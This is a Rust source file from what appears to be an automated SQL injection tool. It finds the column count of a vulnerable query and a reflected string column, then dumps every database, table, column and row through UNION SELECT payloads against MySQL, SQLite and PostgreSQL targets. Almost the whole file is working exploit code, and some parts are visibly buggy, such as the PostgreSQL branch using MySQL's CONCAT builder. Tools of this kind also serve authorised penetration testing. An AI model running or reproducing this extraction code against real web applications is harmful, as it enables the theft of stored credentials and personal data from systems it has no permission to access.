use std::collections::HashMap;

use crate::cli::Method;
use crate::http::HttpClient;
use crate::models::{DbDump, DbEngine, InjectionPoint, InjectionType, TableDump};

const MAX_ROWS: usize = 100;
const MAX_COLS: usize = 20;
const MARKER_START: &str = "VSTART";
const MARKER_END: &str = "VEND";

pub fn extract(
    client: &HttpClient,
    url: &str,
    method: &Method,
    params: &HashMap<String, String>,
    point: &InjectionPoint,
) -> Vec<DbDump> {
    let original = params.get(&point.param).cloned().unwrap_or_default();

    // Choose SQL comment style by engine
    let comments: &[&str] = match point.db_engine {
        DbEngine::MySQL => &["-- -", "#"],
        DbEngine::SQLite => &["-- -"],
        DbEngine::PostgreSQL => &["-- -"],
        DbEngine::Unknown => &["-- -", "#"],
    };

    // For time-based, fall back to blind extraction (not implemented here in detail)
    // For error/boolean-based, use UNION extraction
    if point.injection_type == InjectionType::TimeBased {
        println!("    [~] Time-based confirmed — skipping UNION extraction (blind extraction not yet implemented)");
        return vec![];
    }

    // Try each comment style to find working one
    for &comment in comments {
        println!("    [*] Detecting column count (ORDER BY) with comment '{}'...", comment);
        if let Some(col_count) = find_column_count(client, url, method, params, &point.param, &original, comment) {
            println!("    [+] Column count: {}", col_count);

            if let Some(str_col) = find_string_column(client, url, method, params, &point.param, &original, col_count, comment) {
                println!("    [+] String-injectable column index: {}", str_col);

                let result = match point.db_engine {
                    DbEngine::MySQL | DbEngine::Unknown => extract_mysql(
                        client, url, method, params, &point.param, &original,
                        col_count, str_col, comment,
                    ),
                    DbEngine::SQLite => extract_sqlite(
                        client, url, method, params, &point.param, &original,
                        col_count, str_col, comment,
                    ),
                    DbEngine::PostgreSQL => extract_postgresql(
                        client, url, method, params, &point.param, &original,
                        col_count, str_col, comment,
                    ),
                };
                return result;
            } else {
                println!("    [-] No injectable string column found with comment '{}'", comment);
            }
        } else {
            println!("    [-] ORDER BY technique failed with comment '{}'", comment);
        }
    }

    println!("    [-] Could not determine column count. Extraction failed.");
    vec![]
}

// ─── Column count detection ──────────────────────────────────────────────────

fn find_column_count(
    client: &HttpClient,
    url: &str,
    method: &Method,
    params: &HashMap<String, String>,
    param: &str,
    original: &str,
    comment: &str,
) -> Option<usize> {
    // Get baseline body to detect error vs non-error state
    let baseline = client.send_raw(url, method, params).ok()?.1;

    for n in 1..=MAX_COLS {
        let payload = format!("{}' ORDER BY {}{}",  original, n, comment);
        match client.send(url, method, params, param, &payload) {
            Ok((_, body, _)) => {
                let is_error = is_order_by_error(&body, &baseline);
                if is_error {
                    // n columns caused an error → column count is n-1
                    return if n > 1 { Some(n - 1) } else { None };
                }
            }
            Err(_) => return if n > 1 { Some(n - 1) } else { None },
        }
    }
    // If we never got an error, try a different approach: UNION SELECT NULLs
    find_column_count_union(client, url, method, params, param, original, comment)
}

fn find_column_count_union(
    client: &HttpClient,
    url: &str,
    method: &Method,
    params: &HashMap<String, String>,
    param: &str,
    original: &str,
    comment: &str,
) -> Option<usize> {
    for n in 1..=MAX_COLS {
        let nulls = vec!["NULL"; n].join(",");
        let payload = format!("{}' UNION SELECT {}{}",  original, nulls, comment);
        if let Ok((_, body, _)) = client.send(url, method, params, param, &payload) {
            // If no SQL error in the response, we found the right count
            if !crate::detection::contains_sql_error(&body) {
                return Some(n);
            }
        }
    }
    None
}

fn is_order_by_error(body: &str, baseline: &str) -> bool {
    // An ORDER BY n error makes the page differ drastically or contain SQL errors
    if crate::detection::contains_sql_error(body) {
        return true;
    }
    // If body becomes very short (empty result), that's also a sign
    if baseline.len() > 50 && body.len() < baseline.len() / 4 {
        return true;
    }
    false
}

// ─── String column detection ─────────────────────────────────────────────────

fn find_string_column(
    client: &HttpClient,
    url: &str,
    method: &Method,
    params: &HashMap<String, String>,
    param: &str,
    original: &str,
    col_count: usize,
    comment: &str,
) -> Option<usize> {
    for i in 0..col_count {
        let cols: Vec<String> = (0..col_count)
            .map(|j| {
                if j == i {
                    format!("'{}TEST{}'", MARKER_START, MARKER_END)
                } else {
                    "NULL".to_string()
                }
            })
            .collect();
        let payload = format!("{}' UNION SELECT {}{}",  original, cols.join(","), comment);
        if let Ok((_, body, _)) = client.send(url, method, params, param, &payload) {
            if body.contains(&format!("{}TEST{}", MARKER_START, MARKER_END)) {
                return Some(i);
            }
        }
    }
    None
}

// ─── Marker extraction helper ─────────────────────────────────────────────────

fn extract_marker(body: &str) -> Option<String> {
    let start_pos = body.find(MARKER_START)?;
    let value_start = start_pos + MARKER_START.len();
    let end_pos = body[value_start..].find(MARKER_END)?;
    Some(body[value_start..value_start + end_pos].to_string())
}

// ─── UNION payload builder ────────────────────────────────────────────────────

fn make_union_payload(
    original: &str,
    col_count: usize,
    str_col: usize,
    inner_query: &str,
    comment: &str,
) -> String {
    let cols: Vec<String> = (0..col_count)
        .map(|j| {
            if j == str_col {
                // Wrap extracted value in markers so we can find it in the HTML
                format!(
                    "CONCAT('{}',({}),'{}') ",
                    MARKER_START, inner_query, MARKER_END
                )
            } else {
                "NULL".to_string()
            }
        })
        .collect();
    format!("{}' UNION SELECT {}{}", original, cols.join(","), comment)
}

/// SQLite uses || for concatenation
fn make_union_payload_sqlite(
    original: &str,
    col_count: usize,
    str_col: usize,
    inner_query: &str,
    comment: &str,
) -> String {
    let cols: Vec<String> = (0..col_count)
        .map(|j| {
            if j == str_col {
                format!("'{}' || ({}) || '{}'", MARKER_START, inner_query, MARKER_END)
            } else {
                "NULL".to_string()
            }
        })
        .collect();
    format!("{}' UNION SELECT {}{}", original, cols.join(","), comment)
}

/// Extract all values for a query (paginates with LIMIT/OFFSET)
fn extract_all(
    client: &HttpClient,
    url: &str,
    method: &Method,
    params: &HashMap<String, String>,
    param: &str,
    original: &str,
    col_count: usize,
    str_col: usize,
    comment: &str,
    query_fn: &dyn Fn(usize) -> String,
) -> Vec<String> {
    let mut results = vec![];
    for offset in 0..MAX_ROWS {
        let inner = query_fn(offset);
        let payload = make_union_payload(original, col_count, str_col, &inner, comment);
        match client.send(url, method, params, param, &payload) {
            Ok((_, body, _)) => match extract_marker(&body) {
                Some(val) if !val.is_empty() => results.push(val),
                _ => break,
            },
            Err(_) => break,
        }
    }
    results
}

/// Same but using SQLite concatenation
fn extract_all_sqlite(
    client: &HttpClient,
    url: &str,
    method: &Method,
    params: &HashMap<String, String>,
    param: &str,
    original: &str,
    col_count: usize,
    str_col: usize,
    comment: &str,
    query_fn: &dyn Fn(usize) -> String,
) -> Vec<String> {
    let mut results = vec![];
    for offset in 0..MAX_ROWS {
        let inner = query_fn(offset);
        let payload = make_union_payload_sqlite(original, col_count, str_col, &inner, comment);
        match client.send(url, method, params, param, &payload) {
            Ok((_, body, _)) => match extract_marker(&body) {
                Some(val) if !val.is_empty() => results.push(val),
                _ => break,
            },
            Err(_) => break,
        }
    }
    results
}

// ─── MySQL / MariaDB extraction ───────────────────────────────────────────────

fn extract_mysql(
    client: &HttpClient,
    url: &str,
    method: &Method,
    params: &HashMap<String, String>,
    param: &str,
    original: &str,
    col_count: usize,
    str_col: usize,
    comment: &str,
) -> Vec<DbDump> {
    println!("    [*] Extracting databases (MySQL)...");

    let db_names = extract_all(
        client, url, method, params, param, original, col_count, str_col, comment,
        &|offset| format!(
            "SELECT schema_name FROM information_schema.schemata LIMIT 1 OFFSET {}",
            offset
        ),
    );

    println!("    [+] Databases found: {}", db_names.join(", "));

    let mut dumps = vec![];

    for db_name in &db_names {
        println!("    [*] Extracting tables from '{}'...", db_name);

        let table_names = extract_all(
            client, url, method, params, param, original, col_count, str_col, comment,
            &|offset| format!(
                "SELECT table_name FROM information_schema.tables WHERE table_schema='{}' LIMIT 1 OFFSET {}",
                db_name, offset
            ),
        );

        println!("      [+] Tables: {}", table_names.join(", "));

        let mut tables = vec![];

        for table_name in &table_names {
            println!("      [*] Extracting columns from '{}.{}'...", db_name, table_name);

            let columns = extract_all(
                client, url, method, params, param, original, col_count, str_col, comment,
                &|offset| format!(
                    "SELECT column_name FROM information_schema.columns WHERE table_schema='{}' AND table_name='{}' LIMIT 1 OFFSET {}",
                    db_name, table_name, offset
                ),
            );

            println!("        [+] Columns: {}", columns.join(", "));

            // Dump rows using all columns concatenated with '|'
            let rows = if !columns.is_empty() {
                let col_expr = columns
                    .iter()
                    .map(|c| format!("`{}`", c))
                    .collect::<Vec<_>>()
                    .join(", 0x7c, "); // 0x7c = '|'
                let col_concat = format!("CONCAT_WS(0x7c, {})", col_expr);

                extract_all(
                    client, url, method, params, param, original, col_count, str_col, comment,
                    &|offset| format!(
                        "SELECT {} FROM `{}`.`{}` LIMIT 1 OFFSET {}",
                        col_concat, db_name, table_name, offset
                    ),
                )
                .into_iter()
                .map(|row| row.split('|').map(String::from).collect())
                .collect()
            } else {
                vec![]
            };

            println!("        [+] Rows extracted: {}", rows.len());

            tables.push(TableDump {
                name: table_name.clone(),
                columns,
                rows,
            });
        }

        dumps.push(DbDump {
            name: db_name.clone(),
            tables,
        });
    }

    dumps
}

// ─── SQLite extraction ────────────────────────────────────────────────────────

fn extract_sqlite(
    client: &HttpClient,
    url: &str,
    method: &Method,
    params: &HashMap<String, String>,
    param: &str,
    original: &str,
    col_count: usize,
    str_col: usize,
    comment: &str,
) -> Vec<DbDump> {
    println!("    [*] Extracting tables (SQLite)...");

    let table_names = extract_all_sqlite(
        client, url, method, params, param, original, col_count, str_col, comment,
        &|offset| format!(
            "SELECT name FROM sqlite_master WHERE type='table' LIMIT 1 OFFSET {}",
            offset
        ),
    );

    println!("    [+] Tables found: {}", table_names.join(", "));

    let mut tables = vec![];

    for table_name in &table_names {
        println!("    [*] Extracting schema for '{}'...", table_name);

        // Get CREATE TABLE statement to parse column names
        let schema_rows = extract_all_sqlite(
            client, url, method, params, param, original, col_count, str_col, comment,
            &|_| format!(
                "SELECT sql FROM sqlite_master WHERE type='table' AND name='{}'",
                table_name
            ),
        );

        let columns = if let Some(schema) = schema_rows.first() {
            parse_sqlite_columns(schema)
        } else {
            vec![]
        };

        println!("      [+] Columns: {}", columns.join(", "));

        let rows = if !columns.is_empty() {
            let col_expr = columns
                .iter()
                .map(|c| format!("CAST(`{}` AS TEXT)", c))
                .collect::<Vec<_>>()
                .join(" || '|' || ");

            extract_all_sqlite(
                client, url, method, params, param, original, col_count, str_col, comment,
                &|offset| format!(
                    "SELECT {} FROM `{}` LIMIT 1 OFFSET {}",
                    col_expr, table_name, offset
                ),
            )
            .into_iter()
            .map(|row| row.split('|').map(String::from).collect())
            .collect()
        } else {
            vec![]
        };

        println!("      [+] Rows extracted: {}", rows.len());

        tables.push(TableDump {
            name: table_name.clone(),
            columns,
            rows,
        });
    }

    vec![DbDump {
        name: "main".to_string(),
        tables,
    }]
}

/// Parse column names from a CREATE TABLE SQL statement.
/// e.g. "CREATE TABLE users (id INTEGER, name TEXT, pass TEXT)"
fn parse_sqlite_columns(create_sql: &str) -> Vec<String> {
    let lower = create_sql.to_lowercase();
    let start = match lower.find('(') {
        Some(pos) => pos + 1,
        None => return vec![],
    };
    let end = match create_sql.rfind(')') {
        Some(pos) => pos,
        None => return vec![],
    };

    create_sql[start..end]
        .split(',')
        .map(|part| part.trim())
        .filter(|part| !part.is_empty())
        .filter_map(|part| {
            // Skip constraints like PRIMARY KEY, FOREIGN KEY, UNIQUE, CHECK
            let first = part.split_whitespace().next().unwrap_or("").to_uppercase();
            if matches!(first.as_str(), "PRIMARY" | "FOREIGN" | "UNIQUE" | "CHECK" | "CONSTRAINT") {
                None
            } else {
                // Column name is first token; strip quotes if present
                Some(
                    part.split_whitespace()
                        .next()
                        .unwrap_or("")
                        .trim_matches(|c| c == '"' || c == '\'' || c == '`')
                        .to_string(),
                )
            }
        })
        .collect()
}

// ─── PostgreSQL extraction ────────────────────────────────────────────────────

fn extract_postgresql(
    client: &HttpClient,
    url: &str,
    method: &Method,
    params: &HashMap<String, String>,
    param: &str,
    original: &str,
    col_count: usize,
    str_col: usize,
    comment: &str,
) -> Vec<DbDump> {
    println!("    [*] Extracting databases (PostgreSQL)...");

    let db_names = extract_all(
        client, url, method, params, param, original, col_count, str_col, comment,
        &|offset| format!(
            "SELECT datname FROM pg_database LIMIT 1 OFFSET {}",
            offset
        ),
    );

    println!("    [+] Databases found: {}", db_names.join(", "));

    let mut dumps = vec![];

    for db_name in &db_names {
        println!("    [*] Extracting tables from '{}'...", db_name);

        let table_names = extract_all(
            client, url, method, params, param, original, col_count, str_col, comment,
            &|offset| format!(
                "SELECT table_name FROM information_schema.tables WHERE table_schema='public' LIMIT 1 OFFSET {}",
                offset
            ),
        );

        println!("      [+] Tables: {}", table_names.join(", "));

        let mut tables = vec![];

        for table_name in &table_names {
            println!("      [*] Extracting columns from '{}'...", table_name);

            let columns = extract_all(
                client, url, method, params, param, original, col_count, str_col, comment,
                &|offset| format!(
                    "SELECT column_name FROM information_schema.columns WHERE table_name='{}' LIMIT 1 OFFSET {}",
                    table_name, offset
                ),
            );

            println!("        [+] Columns: {}", columns.join(", "));

            let rows = if !columns.is_empty() {
                let col_expr = columns
                    .iter()
                    .map(|c| format!("COALESCE({}::TEXT,'')", c))
                    .collect::<Vec<_>>()
                    .join(" || '|' || ");

                extract_all(
                    client, url, method, params, param, original, col_count, str_col, comment,
                    &|offset| format!(
                        "SELECT {} FROM {} LIMIT 1 OFFSET {}",
                        col_expr, table_name, offset
                    ),
                )
                .into_iter()
                .map(|row| row.split('|').map(String::from).collect())
                .collect()
            } else {
                vec![]
            };

            println!("        [+] Rows extracted: {}", rows.len());

            tables.push(TableDump {
                name: table_name.clone(),
                columns,
                rows,
            });
        }

        dumps.push(DbDump {
            name: db_name.clone(),
            tables,
        });
    }

    dumps
}
